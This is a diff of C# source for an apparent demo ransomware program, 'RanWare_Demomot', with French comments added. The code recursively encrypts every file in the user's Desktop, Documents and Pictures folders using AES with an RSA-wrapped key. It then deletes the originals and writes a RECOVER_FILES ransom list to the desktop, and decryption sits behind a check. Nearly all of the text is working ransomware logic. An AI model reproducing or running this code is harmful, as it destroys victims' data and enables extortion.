@@ -7,15 +7,14 @@ namespace RanWare_Demomot
     public partial class Form1 : Form
     {
         // Declare CspParmeters and RsaCryptoServiceProvider
-        // objects with global scope of your Form class.
+        // objects with global scope of Form class.
+        //Permet d'utiliser le service rsa
         readonly CspParameters cspP = new CspParameters();
         RSACryptoServiceProvider rsa;
 
-
+        bool isDecripted;
         List<string> filesName = new List<string>();//Liste qui va contenir les nom des fichiers
         int numberOfFiles;//Variables pour conter le nombre de fichiers encryptés
-
-        
 
         const bool ENCRYPT_DESKTOP = true;//Encrypte le bureau
         const bool DECRYPT_DESKTOP = true;//Decrypte le bureau
@@ -28,9 +27,9 @@ namespace RanWare_Demomot
         //// Public key file
         //const string PubKeyFile = @"c:\encrypt\rsaPublicKey.txt";
 
-        string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
-        string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-        string Pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
+        string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);//Repertoire du bureau
+        string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);//Repertoire documents
+        string Pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);//Repertoire photos
 
         
 
@@ -58,11 +57,11 @@ namespace RanWare_Demomot
                 encryptFolderFiles(Documents);
             }
 
-            lblNbr.Text = Convert.ToString(numberOfFiles);
+            lblNbr.Text = Convert.ToString(numberOfFiles);//Affiche le nombre de fichiers encryptés
 
             if (numberOfFiles > 0)
             {
-                ransomLetter(filesName);
+                ransomLetter(filesName);//Crée un fichier texte affichant tous les fichiers encryptés
             }
             
         }
@@ -80,17 +79,19 @@ namespace RanWare_Demomot
                 PersistKeyInCsp = true
             };
 
-            foreach (string f in Directory.GetFiles(sDir))
+            //Envois à la méthode EncryptFile les fichiers trouvé
+            foreach (string files in Directory.GetFiles(sDir))
             {
-                if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
+                if (!files.Contains(ENCRYPTED_FILE_EXTENSION))
                 {
-                    EncryptFile(new FileInfo (f));
+                    EncryptFile(new FileInfo (files));
                 }
             }
 
-            foreach (string d in Directory.GetDirectories(sDir))
+            //Si un dossier est trouvé, retourne à la màthode encryptFolderFiles pour encrypter les fichiers du dossier
+            foreach (string directory in Directory.GetDirectories(sDir))
             {
-                encryptFolderFiles(d);
+                encryptFolderFiles(directory);
             }
         }
 
@@ -100,17 +101,14 @@ namespace RanWare_Demomot
         /// <param name="inputFile"></param>Fichier à encrypter
         private void EncryptFile(FileInfo inputFile)
         {
-            if (inputFile.Extension != ".ini" && inputFile.Name != "RECOVER_FILES.txt")
+            if (inputFile.Extension != ".ini" && inputFile.Name != "RECOVER_FILES.txt")//évite les fichier .ini et le fichier texte affichant tous les fichiers encrypter
             {
-                // Create instance of Aes for
-                // symmetric encryption of the data.
+                //Crée une instance de la classe Aes pour l'encryptage symetrique(une seule clef)
                 Aes aes = Aes.Create();
                 ICryptoTransform transform = aes.CreateEncryptor();
 
-                // Use RSACryptoServiceProvider to
-                // encrypt the AES key.
-                // rsa is previously instantiated:
-                //    rsa = new RSACryptoServiceProvider(cspp);
+                //Encrypt la clef Aes avec le service RSA
+                //rsa doit être instentié précedement
                 byte[] keyEncrypted = rsa.Encrypt(aes.Key, false);
 
                 // Create byte arrays to contain
@@ -129,8 +127,6 @@ namespace RanWare_Demomot
                 // - the encrypted cipher content
 
                 // Crée le nouveau fichier encrypter
-                //string outFile = Path.Combine(Path.ChangeExtension(inputFile.Name, ENCRYPTED_FILE_EXTENSION));//Original
-
                 string testPath = Path.GetFullPath(inputFile.FullName);
                 string outFile = Path.Combine(testPath);
 
@@ -142,14 +138,10 @@ namespace RanWare_Demomot
                     outFs.Write(keyEncrypted, 0, lKey);
                     outFs.Write(aes.IV, 0, lIV);
 
-                    // Now write the cipher text using
-                    // a CryptoStream for encrypting.
+                    // Ecrit le texte encrypté utilise CryptoStream
                     using (var outStreamEncrypted =
                         new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                     {
-                        // By encrypting a chunk at
-                        // a time, you can save memory
-                        // and accommodate large files.
                         int count = 0;
                         int offset = 0;
 
@@ -172,13 +164,13 @@ namespace RanWare_Demomot
                     }
                 }
                 filesName.Add(inputFile.FullName);//Ajoute le fichier encrypté à la liste
-                numberOfFiles++;
-                File.Delete(inputFile.FullName);
+                numberOfFiles++;//Incrémente le nombre de fichiers
+                File.Delete(inputFile.FullName);//Supprime le fichier originel
             }
         }
 
         /// <summary>
-        /// Envoi chaque fichier du repertoire à la méthode qui les decryptes
+        /// Envoi chaque fichier du repertoire à la méthode qui les decryptes (même principe que pour l'encryptage)
         /// </summary>
         /// <param name="sDir"></param>Répertoire ou l'on veut chercher les fichiers à dercrypter
         private void decryptFolderFiles(string sDir)
@@ -215,11 +207,13 @@ namespace RanWare_Demomot
                 {
                     decryptFolderFiles(Pictures);
                 }
+                ransomLetter(filesName);
             }
             else
             {
                 MessageBox.Show("Bien essayé");
             }
+            
         }
 
         /// <summary>
@@ -228,8 +222,7 @@ namespace RanWare_Demomot
         /// <param name="file"></param>Fichier à decrypter
         private void DecryptFile(FileInfo file)
         {
-            // Create instance of Aes for
-            // symmetric decryption of the data.
+            // Crée une instance Aes
             Aes aes = Aes.Create();
 
             // Create byte arrays to get the length of
@@ -239,10 +232,11 @@ namespace RanWare_Demomot
             byte[] LenK = new byte[4];
             byte[] LenIV = new byte[4];
 
-            // Construct the file name for the decrypted file.
+            //Crée le fichier non encrypté
             string outFile =
                 Path.ChangeExtension(file.FullName.Replace("Encrypt", "Decrypt"), "");
 
+            //Utilise FileStream pour lire le fichier encrypté
             // Use FileStream objects to read the encrypted
             // file (inFs) and save the decrypted file (outFs).
             using (var inFs = new FileStream(file.FullName, FileMode.Open))
@@ -281,7 +275,7 @@ namespace RanWare_Demomot
                 // to decrypt the AES key.
                 byte[] KeyDecrypted = rsa.Decrypt(KeyEncrypted, false);
 
-                // Decrypt the key.
+                //Decrypte la clef
                 ICryptoTransform transform = aes.CreateDecryptor(KeyDecrypted, IV);
 
                 // Decrypt the cipher text from
@@ -317,18 +311,41 @@ namespace RanWare_Demomot
                     }
                 }
             }
-            File.Delete(file.FullName);
+            File.Delete(file.FullName);//Efface le fichier encrypté
         }
 
+        /// <summary>
+        /// Crée un fichier de "rançon" regroupant tous les nom des fichiers encrypté
+        /// </summary>
+        /// <param name="files"></param>
         private void ransomLetter(List<string> files)
         {
-            StreamWriter ransomWriter = new StreamWriter(Desktop + @"\RECOVER_FILES.txt");
-            foreach (string fileName in files)
+            string path = Desktop + @"\RECOVER_FILES.TXT";
+            FileInfo fi = new FileInfo(path);
+            if (fi.Exists)
             {
-                ransomWriter.WriteLine(fileName);
+                fi.Delete();
+            }
+            //StreamWriter ransomWriter = new StreamWriter(Desktop + @"\RECOVER_FILES.txt");
+
+            //FileInfo fi = new FileInfo(Desktop + @"\RECOVER_FILES.TXT");//Test
+
+            using (FileStream fs = fi.Create())
+            {
+                foreach (string fileName in files)
+                {
+                    Byte[] info = new UTF8Encoding(true).GetBytes(fileName + "\n");
+                    fs.Write(info, 0, info.Length);
+                }
             }
 
-            ransomWriter.Close();
+            //foreach (string fileName in files)
+            //{
+            //    fi.WriteLine(fileName);
+            //}
+            
+
+            //ransomWriter.Close();
         }
     }
 }
